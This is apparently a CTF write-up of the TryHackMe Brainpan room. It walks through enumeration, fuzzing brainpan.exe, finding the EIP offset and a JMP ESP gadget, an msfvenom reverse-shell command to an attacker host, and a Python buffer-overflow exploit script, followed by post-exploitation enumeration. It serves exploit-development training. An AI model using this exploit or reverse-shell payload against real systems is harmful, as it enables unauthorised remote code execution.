# BrainPan

Brainpan is perfect for OSCP practice and has been highly recommended to complete before the exam. Exploit a buffer overflow vulnerability by analyzing a Windows executable on a Linux machine. 

# Initial Enumeration:

### NMAP

```
# nmap -Pn -sV -sC THM_TARGET
...
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
| _|                                                                 _|      
| _|_|_|   _|  _|_|   _|_|_|   _|_|_|   _|_|_|   _|_|_|   _|_|_|   _|_|_|    
| _|    _|  _|  _|   _|    _|  _|    _|  _|    _|  _|    _|  _|    _|    _|  
| _|    _|  _|  _|   _|    _|  _|    _|  _|    _|  _|    _|  _|    _|    _|  
| _|_|_|   _|  _|_|   _|_|_|   _|_|_|   _|_|_|   _|_|_|   _|  _|   _|    _|  
|
[________________________ WELCOME TO BRAINPAN _________________________]
                        ENTER THE PASSWORD
                                >>

10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=5/31%Time=6A1C692E%P=x86_64-pc-linux-gnu%r(NU
...
```
Two ports: 9999 abyss? likely a running process similar to earlier CTF running on 9999. Tested with netcat IP 9999 and sure enought the same screen appeared to ascii art from nmap requesting password.
Port 10000 was a simpleHTTPServer accessible via web browser. Displaying web page "Are you practicing safe coding?" referencing 2011 as proved to be year of the hack suggesting old content.

### Gobuster 
A quick search of port 10000 showed one folder of interest and its contents accessible via browser.
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/openvpn-troubleshooting-2025-infra-upgrades]
└─$ gobuster dir -u http://10.49.167.39:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.167.39:10000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
bin                  (Status: 301) [Size: 0] [--> /bin/]
```
In IP:10000/bin/ was a single exe file brainpan.exe. 
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/BrainPan]
└─$ file brainpan.exe                     
brainpan.exe: PE32 executable for MS Windows 4.00 (console), Intel i386 (stripped to external PDB), 5 sections
```
PE32 executable
It’s a Windows binary, 32‑bit, compiled for x86.

Windows 4.00
This corresponds to Windows NT 4.0 era toolchains — extremely old.

### Test brainpan.exe

- Loaded on a Windows 8 VM in immunity I used a python script to send 100,200, and 1000 Ascii character \x41 or A. Only when 2000 used did it crash the application. 
- To determine the EIP next I used msf-pattern_create -l 1000 then determined its position of EIP offset with msf-pattern_offset -q <4 characters in EIP>

```
└─$ msf-pattern_create -l 2000
Aa0Aa1Aa2Aa3A...
...
└─$ nc Target_IP 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> Aa0Aa1Aa2A...
...
└─$ msf-pattern_offset -q 35724134
[*] Exact match at offset 524
                                         
```
Now offset determined, next quick look at badchar that might affect it.
- Ran similar python script added 4 * b'B' and added bad char list from \x01 to \xff
- No clear sign of bad char not displayed, they all appeared visible so assume only \x00 is bad.
- This also verified EIP offset 524 with EIP filled with 42424242 as expected.

Use Mona to find a JMP ESP gadget to jump to ESP and use its location in the EIP to kick start into the nop sled leading to shellcode. 
- JMP ESP location best suited was 0x311712f3 

```
# mona.py output

| Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Details                                                                                       |
| ---------- | ---------- | ---------- | ------ | ------- | ----- | ----- | -------- | ------ | --------------------------------------------------------------------------------------------- |
...
| 0x31170000 | 0x31176000 | 0x00006000 | False  | False   | False | False | False    | False  | -1.0- [brainpan.exe] (C:\Users\Administrator\Desktop\TRYHACKME CTF\Brainpan\brainpan.exe) 0x0 |
...
| 0x75500000 | 0x7550a000 | 0x0000a000 | True   | False   | True  | True  | True     | True   | 6.3.9600.17415 [CRYPTBASE.dll] (C:\Windows\SYSTEM32\CRYPTBASE.dll) 0x4540                     |
...
----------

## Results

0x311712f3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [brainpan] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\TRYHACKME CTF\Brainpan\brainpan.exe), 0x0
```
Then that just leads us to preparing a shell code we know its windows so:
```
msfvenom -p windows/shell_reverse_tcp LHOST=Attacker_IP LPORT=7777 -b "\x00" -f c   
```
Then implement the combined python code: 
```
import socket
import sys

padding = b'A' * 524  
EIP = b"\xf3\x12\x17\x31"
nop = b"\x90"  * 16
shellcode = (b"\xda\xd3\xb8\xa1\x9f\xcf\xe3\xd9\x74\x24\xf4\x5b\x2b\xc9"
...boring bits
b"\xb5")

try: 
	print("Sending payload:...")
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('Target_IP',9999))
	s.recv(1024)
	s.send(padding + EIP + nop + shellcode + b'\r\n')
	s.close()

except:
	print("Cannot connect to the server")
	sys.exit()
```
### Reverse shell success

First thing I notice and learnt was whoami failed. Turns out whoami did not exist in early Windows NT (NT 3.x / NT 4.0 era). It was introduced much later (Windows XP / Server 2003).
The closest it had was echo %USERNAME% and hostname which work in all later versions of windows.

Next check set to see environment variables, ver to see the OS version, tasklist to list running processes.

On first inspection a script Checksrv.sh appears to keep brainpan.exe and SimpleHTTPServer running:
```
Z:\home\puck>type checsrv.sh
File not found.

Failed to open 'checsrv.sh'

Z:\home\puck>type checksrv.sh
#!/bin/bash
# run brainpan.exe if it stops
lsof -i:9999
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep brainpan.exe | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
                killall wineserver
                killall winedevice.exe
        fi
        /usr/bin/wine /home/puck/web/bin/brainpan.exe &
fi 

# run SimpleHTTPServer if it stops
lsof -i:10000
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
        fi
        cd /home/puck/web
        /usr/bin/python -m SimpleHTTPServer 10000
fi 

Z:\home\puck>
```
